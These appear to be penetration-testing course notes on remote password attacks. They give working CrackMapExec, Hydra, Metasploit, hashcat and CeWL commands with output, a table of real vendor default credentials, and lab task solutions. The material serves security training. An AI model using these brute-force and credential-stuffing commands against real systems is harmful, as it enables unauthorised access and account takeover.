### Remote Password Attacks

### Network Services

```
# All these services below are hosted using specific permissions and are assigned to specific users. 
# Apart from web applications, these services include (but are not limited to):

FTP         SMB     NFS
IMAP/POP3   SSH     MySQL/MSSQL
RDP         WinRM   VNC
Telnet      SMTP    LDAP

# Accordingly, we need a service that allows us to access the system, execute commands on it, 
# or access its contents via a GUI or the terminal. 
# In this case, the most common services suitable for this are RDP, WinRM, and SSH. (Win/Linux)
```

### WinRM

```
# Windows Remote Management (WinRM) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management). 
# It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. 
# It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), 
# which can call the Distributed Component Object Model (DCOM).
```

[Windows Remote Management(WinRM)](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
[Web Services Management Protocol(WS-Management)](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol)

```
# However, for security reasons, WinRM must be activated and configured manually in Windows 10. 
# Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. 
# In most cases, one uses certificates or only specific authentication mechanisms to increase its security. 
# WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
```

### CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
[Docs](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/)

```
# A handy tool that we can use for our password attacks is CrackMapExec, 
# which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. 
# We recommend reading the official documentation for this tool to become familiar with it.

# Installing tool:

sudo apt-get -y install crackmapexec        # Install
crackmapexec -h                             # Tool help

# Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. 
# CrackMapExec currently supports remote authentication using MSSQL, SMB, SSH, and WinRM.

crackmapexec smb -h                         # check options for SMB

crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>     # Command general patter for using
crackmapexec winrm 10.129.42.197 -u username.list -p password.list                           # Run tool against WinRM, it's IP and password list
output:
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)

# The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. 
```

### Evil-WinRM

[Powershell Remoting Protocol (MS-PSRP)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec)

```
# Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, '
# which allows us to communicate with the WinRM service efficiently.

sudo gem install evil-winrm                  # Install

evil-winrm -i <target-IP> -u <username> -p <password>          # Run tool against WinRM it's IP, and user/pass that got by e.g. CrackMapExec

# If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP),
# which simplifies the operation and execution of commands.
```

### SSH

```
# Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. 
# The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. 
# This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.

# Symmetric Encryption
# Symmetric encryption uses the same key for encryption and decryption. 
# However, anyone who has access to the key could also access the transmitted data. 
# Therefore, a key exchange procedure is needed for secure symmetric encryption. 
# The Diffie-Hellman key exchange method is used for this purpose. 

# Asymmetrical Encryption
# Asymmetric encryption uses two SSH keys: a private key and a public key. 
# The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. 
# If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. 
# Once a connection is established, the server uses the public key for initialization and authentication. 
# If the client can decrypt the message, it has the private key, and the SSH session can begin.

# Hashing
# The hashing method converts the transmitted data into another unique value. 
# SSH uses hashing to confirm the authenticity of messages. 
# This is a mathematical algorithm that only works in one direction.
```

[Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)

### Hydra - SSH

```
# We can use a tool such as Hydra to brute force SSH. 

hydra -L username.list -P password.list ssh://10.129.42.197    # Example of using Hydra with ssh protocol, IP and pass list in options
output:
...
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
...

ssh user@10.129.42.197                                     # Next we can simply login with ssh and cracked creds provided by Hydra.
```

### Remote Desktop Protocol (RDP)

[Remote Desktop Protocol (RDP)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)

```
# Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default. 
# RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. 
# Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission.
```

### Hydra - RDP

```
# We can also use Hydra to perform RDP bruteforcing.

hydra -L user.list -P password.list rdp://10.129.42.197    # Example of using Hydra with rdp protocol, IP and pass list in options

xfreerdp /v:<target-IP> /u:<username> /p:<password>        # Next the same we can use xfreerdp(linux) and cracked creds provided by Hydra.
```

### SMB 

```
# Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks. 
# It is used to implement file and directory sharing and printing services in Windows networks. 
# SMB is often referred to as a file system, but it is not. 
# SMB can be compared to NFS for Unix and Linux for providing drives on local networks.
```

### Hydra - SMB

```
hydra -L user.list -P password.list smb://10.129.42.197     # Example of using Hydra with smb protocol, IP and pass list in options

# However, we may also get the following error describing that the server has sent an invalid reply.
...
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
...

# This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. 
# To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
```

### MSF + CrackMapExec Workaround

```
msfconsole -q                                               # Start MSF
msf6 > use auxiliary/scanner/smb/smb_login                  # Use aux smb module
msf6 auxiliary(scanner/smb/smb_login) > options             # check for required options, and set them above:

msf6 auxiliary(scanner/smb/smb_login) > set user_file username.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run                 # Run scanner
output:
[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# Now we can use CrackMapExec again to view the available shares and what privileges we have for them:

crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

# To communicate with the server via SMB, we can use, for example, the tool smbclient. 
# This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

smbclient -U user \\\\10.129.42.197\\SHARENAME
```

### Password Mutations

### Hashcat

```
# We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 
# Some basic mutation rules of hastcat:

:	  # Do nothing.
l	  # Lowercase all letters.
u     # Uppercase all letters.
c     # Capitalize the first letter and lowercase others.
sXY   # Replace all instances of X with Y.
$!    # Add the exclamation character at the end.

example rule file (custom.rule):
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

# Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list accordingly:

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. 
# One of the most used rules is best64.rule, which can often lead to good results.

ls /usr/share/hashcat/rules/            # check existing rule files on parrot OS host
```

# CeWL

[CeWL repo](https://github.com/digininja/CeWL) 

```
# We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. 
# We can then combine this list with the desired rules and create a customized password list 
# that has a higher probability of guessing a correct password.

cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist        # Run tool against target company domain
wc -l inlane.wordlist

# options in command 
depth to spider (-d), 
the minimum length of the word (-m), 
words in lowercase (--lowercase), 
to store the results (-w).
```

```
# Task solution

nmap -sV -Pn <$target_ip>
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
 
wc -l mut_password.list
93912 mut_password.list

sed -n '/^[[:alnum:][:punct:]]\{11,\}$/p' mut_password.list > mut_pass.list

wc -l mut_pass.list
36240  mut_pass.list

hydra -l sam -P mut_pass.list ftp://<$target_ip> -t 48 -v

ssh sam@<$target_ip>
password: B@t********

find / -name "flag.txt" 2>/dev/null 
```

### Password Reuse / Default Passwords

[Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)

[DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

```
# Administrators have to keep track of all the technology, infrastructure, and applications along with the data being accessed. 
# In this case, the same password is often used for configuration purposes, and then the password is forgotten to be changed for one interface or another.

# Often one network device, such as a router, printer, or a firewall, is overlooked, and the default credentials are used, or the same password is reused.

# Credential Stuffing
# There are various databases that keep a running list of known default credentials. 
# One of them is the DefaultCreds-Cheat-Sheet. 
# Here is a small excerpt from the entire table of this cheat sheet:

Product/Vendor	Username	Password
Zyxel (ssh)	    zyfwp	    PrOw!aN_fXp
APC UPS (web)	apc         apc
Weblogic (web)	system      manager
Weblogic (web)	system      manager
Weblogic (web)	weblogic    weblogic1
Weblogic (web)	WEBLOGIC    WEBLOGIC
Weblogic (web)	PUBLIC      PUBLIC
Weblogic (web)	EXAMPLES    EXAMPLES
...

# Default credentials can also be found in the product documentation, as they contain the steps necessary to set up the service successfully. 
# Some devices/applications require the user to set up a password at install, but others use a default, weak password. 
# Attacking those services with the default or obtained credentials is called Credential Stuffing.
```

```
# Credential Stuffing - Hydra Syntax

hydra -C <user_pass.list> <protocol>://<IP>            # Example pattern
hydra -C user_pass.list ssh://10.129.42.197            # example of command
```

```
# Besides the default credentials for applications, some lists offer them for routers. One of these lists can be found here.
```
[here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

```
# Solution for task

ssh -L 4444:localhost:3306 sam@10.129.xx.xxx
wget https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
grep -i 'mysql' DefaultCreds-Cheat-Sheet.csv > cred.list
(edit a file, add : between values, delete MYSQL value in the beginning of each row)
hydra -C cred.list mysql://localhost:4444
```
